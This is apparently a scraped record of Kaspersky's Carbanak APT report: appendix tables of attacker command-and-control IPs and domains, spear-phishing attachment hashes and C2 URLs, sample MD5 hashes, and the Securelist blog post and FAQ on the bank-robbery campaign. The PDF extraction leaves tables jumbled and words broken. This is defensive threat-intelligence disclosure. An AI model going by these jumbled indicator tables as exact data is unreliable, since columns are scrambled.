name/ System Comment 108.61.197.254 2014-07 Carbanak’s 1046652E0AAA682F89068731FA5E8E50 112.78.3.142 Linux CnC 2014-10 Related to Carbanak Victim's logs 118.163.216.107 2014-10 Related to Carbanak Victim's logs 131.72.138.18 2014-11 Carbanak’s Internet scan 141.60.162.150 Linux CnC 2014-10 Related to Carbanak Victim's logs 146.185.220.200 2014-08 Carbanak’s Victim's logs Linux CnC 162.221.183.109 2014-12 Carbanak’s 1684a5eafd51852c43b4bca48b58980f Windows backconnect 162.221.183.11 2014-12 Carbanak’s 1684a5eafd51852c43b4bca48b58980f Windows backconnect 173.201.45.158 2014-10 Related to Carbanak Victim's logs 173.237.187.203 2014-08 RedKit Victim's logs ExploitKit 174.143.147.168 2014-10 Related to Carbanak 185.10.56.59 2014-08 Carbanak’s 551d41e2a4dd1497b3b27a91922d29cc Windows backconnect 185.10.56.59:443 2014-07 Carbanak’s 4afafa81731f8f02ba1b58073b47abdf Windows backconnect 185.10.58.175 2014-07 Carbanak’s 4afafa81731f8f02ba1b58073b47abdf Linux CnC 188.138.16.214 2014-10 Related to Carbanak Victim's logs 188.138.98.105 2014-10 Carbanak’s 0AD4892EAD67E65EC3DD4C978FCE7D92 Windows backconnect CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak Exploits drop zone that used to install Carbanak CnC of other malware used to install Carbanak IP of financialnewsonline. pw CnC of other malware used after Carbanak's infection TLP: White For any inquiries, please contact intelreports@kaspersky.com 29 First seen in Type Source: Sample md5/Detection name/ System Comment IP/Domain name 188.40.224.76 2014-10 Related to Carbanak Victim's logs 190.97.165.126 2014-08 Related to Carbanak Victim's logs 194.44.218.102 2014-10 Related to Carbanak Victim's logs 195.113.26.195 2014-11 Related to Carbanak Victim's logs 198.101.229.24 2014-10 Related to Carbanak Victim's logs 199.255.116.12 2014-10 Related to Carbanak Victim's logs 199.79.62.69 2014-07 Related to Carbanak 204.227.182.242 2014-10 Related to Carbanak Victim's logs Victim's logs 208.109.248.146 2014-10 Related to Carbanak Victim's logs 209.222.30.5 2014-07 Carbanak’s 1046652E0AAA682F89068731FA5E8E50 Windows backconnect 216.170.117.7 2015-02 Carbanak´s 6ae1bb06d10f253116925371c8e3e74b 216.170.117.88 2015-02 Carbanak´s Linux CnC Linux Cnc 217.172.183.184 2014-10 Related to Carbanak Victim's logs 217.172.186.179 2014-10 Carbanak’s Victim's logs 218.76.220.106 Linux CnC 2014-10 Related to Carbanak Victim's logs 31.131.17.79 2014-09 Carbanak’s Victim's logs plugin CnC 31.131.17.81 2014-09 Carbanak’s Victim's logs plugin CnC 32dsffds8743jsdf. com 2014-10 Carbanak’s 08f83d98b18d3dff16c35a20e24ed49a Linux CnC CnC of other malware used after Carbanak's infection Ip of SSHD backdoor installed after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection Exploits used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection TLP: White For any inquiries, please contact intelreports@kaspersky.com 30 IP/Domain name 37.235.54.48 First seen in Type Source: Sample md5/Detection name/ System Comment 2014-10 Related to Carbanak Victim's logs CnC of other malware used after Carbanak's infection 37.46.114.148 2014-10 Carbanak’s Victim's logs Linux CnC 37.59.202.124 2014-12 Carbanak’s Internet scan Linux CnC 5.101.146.184 2014-10 Carbanak’s Victim's logs Linux CnC 5.135.111.89 2015-02 Carbanak´s 100d516821d99b09718b362d5a4b9a2f Windows backconnect 5.61.32.118 2014-10 Carbanak’s 972092CBE7791D27FC9FF6E9ACC12CC3 Windows backconnect 5.61.38.52 2014-10 Carbanak’s 08f83d98b18d3dff16c35a20e24ed49a Windows backconnect 50.115.127.36 2014-10 Related to Carbanak Victim's logs 50.115.127.37 2014-10 Related to Carbanak Victim's logs 55.198.6.56 2014-10 Related to Carbanak Victim's logs 61.7.219.61 2014-10 Related to Carbanak Victim's logs 62.75.224.229 2014-10 Related to Carbanak Victim's logs 66.55.133.86 2014-10 Carbanak’s 972092CBE7791D27FC9FF6E9ACC12CC3 67.103.159.140 Linux CnC 2014-08 Related to Carbanak Victim's logs 69.64.48.125 2014-10 Related to Carbanak Victim's logs 74.208.170.163 2014-10 Related to Carbanak Victim's logs 78.129.184.4 2014-10 Related to Carbanak Victim's logs CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak CnC of other malware used to install Carbanak Used by criminals to control infected machines Used by criminals to control infected machines TLP: White For any inquiries, please contact intelreports@kaspersky.com 31 First seen in Type Source: Sample md5/Detection name/ System Comment CnC of other malware used to install Carbanak Used by criyminals to control infected machines Used by criminals to control infected machines CnC of other malware used to install Carbanak CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection Used by criminals to control infected machines Exploits used to install Carbanak Used by criminals to control infected machines IP/Domain name 79.99.6.187 2014-08 Related to Carbanak Victim's logs 81.4.110.128 2014-08 Related to Carbanak Victim's logs 83.16.41.202 2014-10 Related to Carbanak Victim's logs 83.166.234.250 2014-10 Carbanak’s F66992766D8F9204551B3C42336B4F6D Windows backconnect 83.246.67.58 2014-10 Related to Carbanak Victim's logs 85.25.117.154 2014-10 Related to Carbanak Victim's logs 85.25.20.109 2014-10 Related to Carbanak Victim's logs 85.25.207.212 2014-10 Related to Carbanak Victim's logs 87.106.8.177 87.98.153.34 2014-10 Related to Carbanak 2014-10 Related to Carbanak Victim's logs Victim's logs 88.198.184.241 2014-12 Carbanak’s 6AE1BB06D10F253116925371C8E3E74B Windows backconnect 91.194.254.38 2014-07 Carbanak’s 446c75b77836b776ec3f502fce48b014 Linux CnC 91.194.254.90 2014-09 Carbanak’s Victim's logs Linux CnC 91.194.254.91 2014-09 Carbanak’s Victim's logs Linux CnC 91.194.254.92 2014-07 Carbanak’s Internet scan Linux CnC 91.194.254.93 2014-07 Carbanak’s Internet scan Linux CnC 91.194.254.94 2014-07 Carbanak’s Internet scan Linux CnC 91.194.254.98 2014-07 Carbanak’s Internet scan Linux CnC TLP: White For any inquiries, please contact intelreports@kaspersky.com 32 IP/Domain name 93.95.102.109 First seen in Type Source: Sample md5/Detection name/ System Comment 2014-10 Related to Carbanak Victim's logs 93.95.99.232 2014-10 Related to Carbanak Victim's logs 94.247.178.230 2014-10 Related to Carbanak Victim's logs 95.0.250.113 2014-10 Related to Carbanak Victim's logs adguard.name 2014-07 Carbanak’s Victim's logs Linux CnC beefeewhewhush- eelu.biz 2014-07 Andromeda's C&C Victim's logs comixed.org 2014-12 Carbanak’s 1684a5eafd51852c43b4bca48b58980f coral-trevel.com 2014-07 Carbanak’s Internet scan Linux CnC Linux CnC datsun-auto.com 2014-04 Carbanak’s cb915d1bd7f21b29edc179092e967331 Linux CnC di-led.com 2014-07 Carbanak’s 446c75b77836b776ec3f502fce48b014 Linux CnC financialnewson- line.pw 2014-07 Carbanak’s 4afafa81731f8f02ba1b58073b47abdf Linux CnC financialwiki.pw 2014-07 Carbanak’s 4afafa81731f8f02ba1b58073b47abdf Linux CnC flowindaho.info 2014-07 Carbanak’s reverse IP 91.194.254.93 Linux CnC freemsk-dns.com 2014-08 Carbanak’s reverse IP 146.185.220.200 Linux CnC gjhhghjg6798.com 2014-10 Carbanak’s 972092CBE7791D27FC9FF6E9ACC12CC3 Linux CnC glonass-map.com 2014-12 Carbanak’s 6AE1BB06D10F253116925371C8E3E74B Linux CnC great-codes.com 2014-10 Carbanak’s 0AD4892EAD67E65EC3DD4C978FCE7D92 icafyfootsinso.ru Linux CnC 2014-08 Related to Carbanak Victim's logs idedroatyxoaxi.ru 2014-08 Related to Carbanak Victim's logs CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used after Carbanak's infection CnC of other malware used to install Carbanak Used by criminals to control infected machines CnC of other malware used to install Carbanak TLP: White For any inquiries, please contact intelreports@kaspersky.com 33 IP/Domain name ivaserivaseeer.biz microloule461soft- c1pol361.com microsoftc1pol361. com First seen in Type Source: Sample md5/Detection name/ System Comment 2014-08 Related to Carbanak Victim's logs CnC of other malware used to install Carbanak 2014-10 Carbanak’s F66992766D8F9204551B3C42336B4F6D Linux CnC 2014-10 Carbanak’s F66992766D8F9204551B3C42336B4F6D Linux CnC mind-finder.com 2014-07 Carbanak’s 0AD4892EAD67E65EC3DD4C978FCE7D92 operatemesscont. net 2014-08 Connect to Victim's logs infected sshd Linux CnC Used by criminals to control infected machines paradise-plaza.com 2014-07 Carbanak’s Internet scan Linux CnC public-dns.us 2014-08 Carbanak’s reverse IP 146.185.220.200 Linux CnC publics-dns.com 2014-07 Carbanak’s Internet scan Linux CnC systemsvc.net 2014-11 Carbanak’s reverse IP 131.72.138.18 Linux CnC system-svc.net 2014-11 Carbanak’s reverse IP 131.72.138.18 Linux CnC traider-pro.com 2014-12 Carbanak’s reverse IP 91.194.254.94 Linux CnC travel-maps.info 2014-07 Carbanak’s reverse IP 91.194.254.38 Linux CnC update-java.net 2014-08 Carbanak’s reverse IP 146.185.220.200 Linux CnC veslike.com 2014-07 Carbanak’s Internet scan Linux CnC wefwe3223wfdsf. com 2014-10 Carbanak’s 08f83d98b18d3dff16c35a20e24ed49a Linux CnC worldnews24.pw 2014-08 Carbanak’s 551d41e2a4dd1497b3b27a91922d29cc Linux CnC worldnewsonline.pw 2014-08 Carbanak’s 551d41e2a4dd1497b3b27a91922d29cc Linux CnC TLP: White For any inquiries, please contact intelreports@kaspersky.com 34 APPENDIX 4: Spear phishing This section contains details on spear phishing emails sent by the attackers to infect victims. MD5: Name of attachment: Drops executable: MD5: Compiled C2 C2 RDP on key on 8fa296efaf87ff4d9179283d42372c52 Соответствие ФЗ- 115 от 24.06.2014г.doc a1979aa159e0c54212122fd8acb24383 Mon Apr 04 20:00:57 2011 update- java.net 1234567812345678 37.235.54.48:443 (Carbanak) (Probably fake) 4afafa81731f8f02ba1b58073b47abdf Tue Jul 01 03:20:06 2014 665b6cb31d962aefa3037b5849889e06 Запрос.doc MD5: Name of attachment: Drops executable: MD5: Compiled Connects to: financialnewsonline.pw/FYocDxXpn5MXsHwZX/kLUAbd3w2/uUTsarcVKYk2W3B6hnc Z/Gafh8U1W805Lo0N/np7E3ICR6qx8keLDJZqUGXJKBDzfc6VYz9TNIlktObQ.htm (185.10.58.175) C2 C2 RDP financialnewsonline.pw, financialwiki.pw TXeyuryWcIuzxkWnyu 185.10.56.59:443 on key on (Carbanak) 2c395f211db2d02cb544448729d0f081 new.doc 551d41e2a4dd1497b3b27a91922d29cc Mon Aug 04 01:10:40 2014 MD5: Name of attachment: Drops executable: MD5: Compiled Connects to: http://worldnewsonline.pw/JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7 m8a19tzQwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKfMjpWBM18eX8VUiimyaUZMGoClZ6 eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4VfyUz.shtml C2s C2 RDP worldnewsonline.pw, worldnews24.pw JDvkyfhZxkMmDSwUkqvReIvC 185.10.56.59:443 on key on (Carbanak) MD5: Name of attachment: Drops executable: MD5: C2 C2 RDP on key on 31e16189e9218cb131fdb13e75d0a94f Анкета- Заявление.doc 4e107d20832fff89a41f04c4dff1739b public- dns.us 1234567812345678 37.235.54.48:443 (Carbanak) TLP: White For any inquiries, please contact intelreports@kaspersky.com 35 db83e301564ff613dd1ca23c30a387f0 Соответствие ФЗ- 115 от 21.07.2014г.doc MD5: Name of attachment: Drops executable: MD5: Compiled Connects to: datsun- auto.com/bDqxEs/Ta6IPJq3zqmRY- .5/8SgGLA- F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- Ucygbtzv4=f8fx cb915d1bd7f21b29edc179092e967331 Tue Apr 08 05:44:12 2014 (Carbanak) MD5: Name of attachment: Drops executable: MD5: Compiled C2s C2 RDP on key on f88a983fc0ef5bb446ae63250e7236dd Приглашение.msg 3dc8c4af51c8c367fbe7c7feef4f6744 Fri Aug 08 00:48:07 2014 worldnewsonline.pw, worldnews24.pw vfDGbiwmiqdN6E2N 185.10.56.59:443 (Carbanak) cb915d1bd7f21b29edc179092e967331 c4a6a111a070856c49905d815f87ab49 ЧОСВЯЮООАГЖЦСЦЧОЧю MD5: Name of attachment: Drops executable: MD5: Connects to: GET /cBAWFvkXi94QxShRTaVVn/YzAxD/X0sZEud.5gNItbvozI3tqT5ly9UYLVii13.bml?tlxCFi Busj=2OVj&9GP=a5houGz&K.F=T&l0.7FBN75=nMPDrlGXq4s7cIAQ0Cl662IwVjxvsiTOlG 0d0pd HTTP/1.1 Host: datsun- auto.com (Carbanak) MD5: Name of attachment: Drops executable: MD5: Compiled 86e48a9be62494bffb3b8e5ecb4a0310 Приглашение.doc 3dc8c4af51c8c367fbe7c7feef4f6744 Fri Aug 08 00:48:07 2014 (Carbanak) 6c7ac8dfd7bc5c2bb1a6d7aec488c298 Соответствие ФЗ- 115 от 02.07.2014г..doc, MD5: Name of attachment: Drops executable: MD5: Compiled Connects to: datsun- auto.com/bDqxEs/Ta6IPJq3zqmRY- .5/8SgGLA- F/I9CstBYT1rK7kx.440Sbtru.cgi?QVzF=tNM2gdtMLscx5bB4uryjM&PfpxBukmcOaD- cb915d1bd7f21b29edc179092e967331 Tue Apr 08 05:44:12 2014 (Carbanak) Ucygbtzv4=f8fx TLP: White For any inquiries, please contact intelreports@kaspersky.com 36 APPENDIX 5: MD5 hashes of Carbanak samples 0022c1fe1d6b036de2a08d50ac5446a5 0155738045b331f44d300f4a7d08cf21 0275585c3b871405dd299d458724db3d 0ad4892ead67e65ec3dd4c978fce7d92 0ad6da9e62a2c985156a9c53f8494171 1046652e0aaa682f89068731fa5e8e50 10e0699f20e31e89c3becfd8bf24cb4c 1300432e537e7ba07840adecf38e543b 15a4eb525072642bb43f3c188a7c3504 16cda323189d8eba4248c0a2f5ad0d8f 1713e551b8118e45d6ea3f05ec1be529 1a4635564172393ae9f43eab85652ba5 1b9b9c8db7735f1793f981d0be556d88 1d1ed892f62559c3f8234c287cb3437c 1e127b92f7102fbd7fa5375e4e5c67d1 1e47e12d11580e935878b0ed78d2294f 1f43a8803498482d360befc6dfab4218 1fd4a01932df638a8c761abacffa0207 20f8e962b2b63170b228ccaff51aeb7d 26d6bb7a4e84bec672fc461487344829 2908afb4de41c64a45e1eb2503169108 2c6112e1e60f083467dc159ffb1ceb6d 2cba1a82a78f4dcbad1087c1b71588c9 2e2aa05a217aacf3105b4ba2288ad475 36cdf98bc79b6997dd4e3a6bed035dca 36dfd1f3bc58401f7d8b56af682f2c38 39012fb6f3a93897f6c5edb1a57f76a0 3dc8c4af51c8c367fbe7c7feef4f6744 407795b49789c2f9ca6eca1fbab3c73e 45691956a1ba4a8ecc912aeb9f1f0612 4afafa81731f8f02ba1b58073b47abdf 4e107d20832fff89a41f04c4dff1739b 4f16b33c074f1c31d26d193ec74aaa56 50f70e18fe0dedabefe9bf7679b6d56c 5443b81fbb439972de9e45d801ce907a 55040dd42ccf19b5af7802cba91dbd7f 551d41e2a4dd1497b3b27a91922d29cc 56bfe560518896b0535e0e4da44266d6 5aeecb78181f95829b6eeeefb2ce4975 5da203fa799d79ed5dde485c1ed6ba76 608bdeb4ce66c96b7a9289f8cf57ce02 6163103103cdacdc2770bd8e9081cfb4 629f0657e70901e3134dcae2e2027396 643c0b9904b32004465b95321bb525eb 6e564dadc344cd2d55374dbb00646d1b 735ff7defe0aaa24e13b6795b8e85539 751d2771af1694c0d5db9d894bd134ca 763b335abecbd3d9a6d923a13d6c2519 763e07083887ecb83a87c24542d70dc5 7b30231709f1ac69e4c9db584be692f0 7d0bbdda98f44a5b73200a2c157077df 7e3253abefa52aeae9b0451cfb273690 874058e8d8582bf85c115ce319c5b0af 88c0af9266679e655298ce19e231dff1 8ace0c156eb6f1548b96c593a15cbb25 933ab95dbf7eb0e9d9470a9272bfaff3 93e44ecfcffdbb1f7f3119251ddb7670 972092cbe7791d27fc9ff6e9acc12cc3 9865bb3b4e7112ec9269a98e029cf5cb 9ad8c68b478e9030859d8395d3fdb870 9f455f0efe8c5ff69adcc456dcf00da6 a1979aa159e0c54212122fd8acb24383 a4bfd2cfbb235d869d87f5485853edae a8dc8985226b7b2c468bb82bad3e4d76 aa55dedff7f5dbe2cc4a47f2f8d44f94 ac5d3fc9da12255759a4a7e4eb3d63e7 acb01930466438d3ee981cb4fc57e196 acb4c5e2f92c84df15faa4846f17ff4e b2e6d273a9b32739c9a26f267ab7d198 b328a01f5b82830cc250e0e429fca69f b400bb2a2f9f0ce176368dc709359d3d b6c08d0db4ca1d9e16f3e164745810ff b79f7d41e30cf7d69a4d5d19dda8942e bddbb91388dd2c01068cde88a5fb939e c179ad6f118c97d3db5e04308d48f89e c1b48ca3066214a8ec988757cc3022b3 c2472adbc1f251acf26b6deb8e7a174b c687867e2c92448992c0fd00a2468752 c77331b822ca5b78c31b637984eda029 cb915d1bd7f21b29edc179092e967331 cc294f8727addc5d363bb23e10be4af2 d943ccb4a3c802d304ac29df259d14f2 db3e8d46587d86519f46f912700372e0 dbd7d010c4657b94f49ca85e4ff88790 e06a0257449fa8dc4ab8ccb6fbf2c50b e613e5252a7172329ee25525758180a4 TLP: White For any inquiries, please contact intelreports@kaspersky.com 37 e742242f28842480e5c2b3357b7fd6ab e938f73a10e3d2afbd77dd8ecb3a3854 eaee5bf17195a03d6bf7189965ee1bdb ef8e417e5adb2366a3279d6680c3b979 f4eddae1c0b40bfedeb89e814a2267a5 f66992766d8f9204551b3c42336b4f6d fad3a7ea0a0c6cb8e20e43667f560d7f fbc310a9c431577f3489237d48763eea ff7fd55796fa66c8245c0b90157c57c7 100d516821d99b09718b362d5a4b9a2f 6ae1bb06d10f253116925371c8e3e74b 72eff79f772b4c910259e3716f1acf49 85a26581f9aadeaa6415c01de60f932d 9ad6e0db5e2f6b59f14dd55ded057b69 a70fea1e6eaa77bdfa07848712efa259 be935b4b3c620558422093d643e2edfe c70cce41ef0e4a206b5b48fa2d460ba4 41fb85acedc691bc6033fa2c4cf6a0bc 1684a5eafd51852c43b4bca48b58980f 08f83d98b18d3dff16c35a20e24ed49a TLP: White For any inquiries, please contact intelreports@kaspersky.com 38 Securelist, the resource for Kaspersky Lab experts’ technical research, analysis, and thoughts. DailyBusiness Eugene Academy SecureList ThreatPost Follow us Kaspersky Lab global Website Eugene DailyBusiness Academy ThreatPost Eugene Kaspersky Blog Daily Kaspersky Lab B2C Blog DailyBusiness Kaspersky Lab B2B Blog DailyBusiness Academy ThreatPost Kaspersky Lab security news service Academy DailyBusiness Kaspersky Lab Academy TLP: White For any inquiries, please contact intelreports@kaspersky.com Securelist, the resource for Kaspersky Lab experts’ technical research, analysis, and thoughts. Eugene Academy SecureList ThreatPost DailyBusiness Follow us Kaspersky Lab global Website Eugene Academy ThreatPost DailyBusiness Eugene Kaspersky Blog Daily Kaspersky Lab B2C Blog DailyBusiness Kaspersky Lab B2B Blog Academy ThreatPost DailyBusiness Kaspersky Lab security news service Academy DailyBusiness Kaspersky Lab Academy Kaspersky Lab HQ 39A/3 Leningradskoe Shosse Moscow, 125212 Russian Federation more contact details Tel: +7-495-797-8700 Fax: +7-495-797-8709"
carbanak,cti-hal,8ab9f3e0c210,G0008,"The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 Content menu Search... Subscribe The Great Bank Robbery: the Carbanak APT APT REPORTS 16 FEB 2015 6 minute read Table of Contents Modus Operandi Cash out procedures Infections and losses FAQ What is Carbanak? What are the malicious purposes of this campaign? Why do you think it is signi!cant? Can you explain the timeline of the campaign? Why didn´t you make the details public until now? Have you reached victims and Computer Emergency Response Teams (CERTs) in those countries where you have detected the incidents? How did you contribute to the investigation? How was the malware distributed? What is the potential impact for victims? Who are the victims? What is the scale of the attack? // AUTHORS GREAT The Great Bank Robbery: Carbanak cyb… Download Full Report PDF The story of Carbanak began when a bank from Ukraine https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 1 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 asked us to help with a forensic investigation. Money was being mysteriously stolen from ATMs. Our initial thoughts tended towards the investigating the hard disk of the ATM system we couldn’t malware. However, upon Tyupkin How are corporate users protected against this type of attack? Does Kaspersky Lab protect their users? !nd anything except a rather odd VPN con!guration (the netmask was set to 172.0.0.0). At this time we regarded it as just another malware attack. Little did we know then that a few months later one of our colleagues would receive a call at 3 a.m. in the middle of the night. On the phone was an account manager, asking us to call a certain number as matter of urgency. The person at the end of the line was the CSO of a Russian bank. One of their systems was alerting that data was being sent from their Domain Controller to the People’s Republic of China. Up to 100 !nancial institutions have been hit.Total !nancial losses could be as a high Tweet as $1bn#TheSAS2015#Carbanak When we arrived on site we were quickly able to !nd the malware on the system. We wrote a batch script that removed the malware from an infected PC, and ran this script on all the computers at the bank. This was done multiple times until we were sure that all the machines were clean. Of course, samples were saved and through them we encountered the Carbanak malware for the !rst time. Modus Operandi Further forensic analysis took us to the point of initial infection: a spear phishing e-mail with a CPL attachment; although in other cases Word documents exploiting known vulnerabilities were used. After executing the shellcode, a backdoor based on Carberp, is installed on the system. This backdoor is what we know today as Carbanak. It is designed for espionage, data ex!ltration and remote control. Each bank robbery took 2-4 months, from https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 2 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 infecting the !rst computer to cashing the Tweet money out #TheSAS2015 #Carbanak Once the attackers are inside the victim´s network, they perform a manual reconnaissance, trying to compromise relevant computers (such as those of administrators’) and use lateral movement tools. In short, having gained access, they will jump through the network until they !nd their point of interest. What this point of interest is, varies according to the attack. What they all have in common, however, is that from this point it is possible to extract money from the infected entity. The gang behind Carbanak does not necessarily have prior knowledge of the inner workings of each bank targeted, since these vary per organisation. So in order to understand how a particular bank operates, infected computers were used to record videos that were then sent to the Command and Control servers. Even though the quality of the videos was relatively poor, they were still good enough for the attackers, armed also with the keylogged data for that particular machine to understand what the victim was doing. This provided them with the knowledge they needed to cash out the money. Cash out procedures During our investigation we found several ways of cashing out: ATMs were instructed remotely to dispense cash without any interaction with the ATM itself, with the cash then collected by mules; the SWIFT network was used to transfer money out of the organisation and into criminals’ accounts; and databases with account information were altered so that fake accounts could be created with a relatively high balance, with mule services being used to collect the money. GREAT WEBINARS 13 MAY 2021, 1:00PM GReAT Ideas. Balalaika Edition BORIS LARIN, DENIS LEGEZO 26 FEB 2021, 12:00PM GReAT Ideas. Green Tea Edition JOHN HULTQUIST, BRIAN BARTHOLOMEW, SUGURU ISHIMARU, VITALY KAMLUK, SEONGSU PARK, YUSUKE NIWA, MOTOHIKO SATO 17 JUN 2020, 1:00PM GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots MARCO PREUSS, DENIS LEGEZO, COSTIN RAIU, KURT BAUMGARTNER, DAN DEMETER, YAROSLAV SHMELEV 26 AUG 2020, 2:00PM GReAT Ideas. Powered by SAS: threat actors advance on new fronts IVAN KWIATKOWSKI, MAHER YAMOUT, NOUSHIN SHABAB, PIERRE DELCHER, FÉLIX AIME, GIAMPAOLO DEDOLA, SANTIAGO PONTIROLI 22 JUL 2020, 2:00PM GReAT Ideas. Powered by SAS: threat hunting and new techniques DMITRY BESTUZHEV, COSTIN RAIU, PIERRE DELCHER, BRIAN BARTHOLOMEW, BORIS LARIN, ARIEL JUNGHEIT, FABIO ASSOLINI https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 3 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 Infections and losses Since we started investigating this campaign we have worked very closely with the law enforcement agencies (LEAs) tracking the Carbanak group. As a result of this cooperation we know that up to 100 targets have been hit. When it comes to !nancial institutions, In at least half of the cases the criminals were able to extract money from the infected institution. Losses per bank range from $2.5 million to approximately $10 million. However, according to information provided by LEAs and the victims themselves, total !nancial losses could be as a high as $1 billion, making this by far the most successful criminal cyber campaign we have ever seen. Losses from #Carbanak per bank range from $2.5 million to approximately $10 Tweet million #TheSAS2015 Our investigation began in Ukraine and then moved to Moscow, with most of the !nancial entities targeted by the group located in Eastern Europe. However thanks to KSN data and data obtained from the Command and Control servers, we know that Carbanak also targets victims in the USA, Germany and China. Now the group is expanding its operations to new areas. These include Malaysia, Nepal, Kuwait and several regions in Africa, among others. The group is still active, and we urge all !nancial organizations to carefully scan their networks for the https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 4 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 presence of Carbanak. If detected, report the intrusion to law enforcement immediately. FROM THE SAME AUTHORS CloudSorcerer – A new APT targeting Russian government entities Stealers, stealers and more stealers APT trends report Q1 2024 Assessing the Y, and How, of the XZ Utils incident DuneQuixote campaign targets Middle Eastern entities with “CR4T” malware For a full description of the campaign, IOCs and list of infections please see our report . To check your network for Carbanak’s presence, you can also use the open IOC !le available here . FAQ What is Carbanak? Carbanak is the name we use for an APT-style campaign targeting (but not limited to) !nancial institutions. The main di""erence with other APT attacks is that attackers do not see data but money as their primary target. We say APT-like, however the attack is not strictly speaking Advanced. Strictly speaking, the main feature de!ning the attackers is Persistence. We name the backdoor Carbanak since it is based on Carberp and the name of the con!guration !le is “anak.cfg”. What are the malicious purposes of this campaign? The attackers in!ltrate the victim´s network looking for https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 5 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 the critical system they can use for cashing money out. Once they have stolen a signi!cant amount of money (from 2.5 to 10 MM USD per entity), they abandon the victim. Why do you think it is signi!cant? Banking entities have always been a primary target for cybercriminals. However it was almost always through their customers. This time attackers are targeting !nancial entities directly in an unprecedented, determined, highly professional and coordinated attack, and using any means from the target to cash as much money out as possible, up to an apparently auto-imposed limit. Can you explain the timeline of the campaign? According to what we know, the !rst malicious samples were compiled in August, 2013 when the cybercriminals started to test the Carbanak malware. The !rst infections were detected in December, 2013. On average, each bank robbery took between two and four months, from infecting the !rst computer at the bank’s corporate network to cashing the money out. We believe that the gang was able to successfully steal from their !rst victims during the period of February-April 2014. The peak of infections was recorded in June 2014. Currently the campaign is still active. Why didn´t you make the details public until now? Since we started working on this campaign we have collaborated with the di""erent LEAs involved in the investigation and helped them as much as possible. As it remains an open investigation, we were asked not to share any details until it was safe to do so. https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 6 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 Have you reached victims and Computer Emergency Response Teams (CERTs) in those countries where you have detected the incidents? Yes, this investigation turned into a joint operation between Kaspersky Lab’s Global Research and Analysis Team and international organizations, national and regional law enforcement agencies and a number of Computer Emergency Response Teams (CERTs) worldwide. One of our main goals was to disseminate our knowledge of the campaign and IOCs among all detected and potential victims. We used national CERTs and LEAs as the distribution channel. How did you contribute to the investigation? We’re helping to assist in investigations and countermeasures that disrupt malware operations and cybercriminal activity. During the investigations we provide technical expertise such as analyzing infection vectors, malicious programs, supported Command & Control infrastructure and exploitation methods. How was the malware distributed? Attackers used spear phishing emails with malicious attachments against employees of the targeted !nancial institutions, in some cases sending them to their personal email addresses. We believe the attackers also used drive by download attacks, but this second assumption is still not 100% con!rmed. What is the potential impact for victims? Based on what the attackers stole from victims, a new victim faces potential losses of up to 10 million $. However this !gure is arbitrary based on what we know: nothing limits the potential loss once an institution is infected. Subscribe to our weekly e-mails The hottest research right in your inbox Email(Required) I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I !nd at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 7 di 14 The Great Bank Robbery: the Carbanak APT | Securelist 17/07/24, 11:59 Who are the victims? What is the scale of the attack? Victims are mainly institutions in the !nancial industry; however we have also found traces of infections in POS terminals and PR agencies. For a sense of the scale of the attack please see the di""erent charts and maps we provide in our report. As with many malware campaigns there are a variety of companies/individuals analyzing the malware, resulting in requests to the Command and Control server. When we analyze those servers, all we see are the IPs and possibly some additional information. When this additional information is not present, and when the IP cannot be traced back to its owner, we mark it as an infection. Based on this approach our analysis concludes that Russia, the US, Germany and China are the most a""ected countries in number of traces of infection (IP addresses). How are corporate users protected against this type of attack? Does Kaspersky Lab protect their users? Yes, we detect Carbanak samples as Backdoor.Win32.Carbanak and Backdoor.Win32.CarbanakCmd. All Kaspersky Lab’s corporate products and solutions detect known Carbanak samples. To raise the level of protection, it is recommended to switch on Kaspersky’s Proactive Defense Module included in each modern product and solution. We also have some general recommendations: Do not open suspicious emails, especially if they have an attachment; Update your software (in this campaign no 0days were used); Turn on heuristics in your security suites, this way it is more likely that such new samples will be detected and https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/ Pagina 8 di 14"
